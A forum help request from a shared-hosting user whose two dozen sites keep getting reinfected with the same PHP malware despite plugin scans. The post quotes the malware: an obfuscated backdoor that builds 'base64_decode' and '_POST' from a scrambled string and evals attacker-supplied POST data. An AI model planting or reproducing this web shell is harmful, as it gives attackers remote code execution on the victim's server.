<p>I have a shared hosting from GoDaddy and of lately one of my websites is infected with malware. I tried cleaning the scan with Wordfence and GOTMLS plugin. They work fine and removed the php malware</p>  <pre><code>&lt;?php $sF="PCT4BA6ODSE_"; $s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]); if (isset(${$s20}['na1226a'])) {     eval($s21(${$s20}['na1226a'])); } ?&gt; </code></pre>  <p>However the same code keeps on appearing again. Earlier it was only one website. But being a shared hosting i created sevral 24 to be exact in nested directories within the main folder. All my sites are infected now. I tried scanning several times but the same php code keeps on appearing. How do i fix it? Can i find anyone who can i fix it? Thanks guys in advance</p>
